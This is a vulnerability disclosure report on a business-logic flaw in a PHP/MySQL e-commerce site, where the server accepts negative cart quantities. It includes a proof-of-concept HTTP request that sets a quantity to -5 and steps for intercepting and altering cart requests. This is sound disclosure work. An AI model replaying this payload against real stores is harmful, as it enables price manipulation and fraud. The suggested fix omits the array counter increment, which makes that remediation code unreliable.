# Report of Business Logic Flaw in Cart Quantity Validation
**Vendor:** PHP-MySQL-ecommerce-website  
**Severity:** High (CVSS 7.5)  
**Status:** Unpatched  

---

## Vulnerability Summary

A business logic vulnerability exists in the cart quantity validation mechanism of the PHP-MySQL-ecommerce-website application. The application fails to validate negative quantity values on the server-side, allowing attackers to manipulate cart calculations and potentially create refund scenarios.

## Technical Details

### Affected Components
- `cart.php` - Cart update functionality
- `checkout.php` - Checkout process

### Root Cause
The application only implements client-side validation for product quantities. Server-side code directly assigns user-provided quantity values without validation:

```php
// cart.php line 33-35
foreach($_POST['quantity'] as $val) {
    $i++;
    $arr2[$i] = $val; // Direct assignment without validation
}
```

### Vulnerability Analysis
The vulnerable code path processes quantity values without server-side validation:
1. User input is directly assigned to `$arr2[$i]`
2. No type checking or range validation is performed
3. Negative values are processed normally and stored in session
4. Subsequent calculations use the unvalidated values

## Proof of Concept

### Attack Payload
```http
POST /cart.php HTTP/2
Host: web.php-mysql-ecommerce-website.orb.local
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=...; 
...

_csrf=8eb7b48253acb7a0276aa498fe829f93&product_id%5B%5D=76&product_name%5B%5D=Gosh+Donoderm+Hand+%26+Nail+Cream&quantity%5B%5D=1&product_id%5B%5D=80&product_name%5B%5D=Jeans+for+Women+-+Denim&quantity%5B%5D=1&product_id%5B%5D=77&product_name%5B%5D=Laptop+Backpack&quantity%5B%5D=-5&form1=Update+Cart
```

### Impact
- **Financial Impact:** Negative quantities can create refund scenarios
- **Data Integrity:** Corrupted cart calculations
- **Business Logic:** Bypass of intended quantity restrictions

## Exploitation

### Prerequisites
- Valid user session
- Access to cart functionality

### Attack Vector
1. Intercept cart update request using proxy tools
2. Modify `quantity[]` parameter to negative value
3. Submit request to server
4. Observe successful processing of negative quantity

## Recommended Fix

### Server-side Validation
```php
// Add validation before processing
foreach($_POST['quantity'] as $val) {
    $quantity = filter_var($val, FILTER_VALIDATE_INT);
    if ($quantity === false || $quantity < 1) {
        http_response_code(400);
        die('Invalid quantity');
    }
    $arr2[$i] = $quantity;
}
```

### Database Constraints
```sql
ALTER TABLE cart_items ADD CONSTRAINT check_quantity 
CHECK (quantity > 0);
```

## CVSS Score Breakdown

- **Attack Vector:** Network (N)
- **Attack Complexity:** Low (L)
- **Privileges Required:** Low (L)
- **User Interaction:** Required (R)
- **Scope:** Changed (C)
- **Confidentiality:** None (N)
- **Integrity:** High (H)
- **Availability:** None (N)

## Timeline

- **Discovery:** [Date]
- **Reported:** [Date]
- **Target Fix:** 30 days
- **Public Disclosure:** 90 days

---

**Reporter:** [Name]  
**Contact:** [Email]  
**CVE ID:** CVE-2024-XXXX (pending assignment)
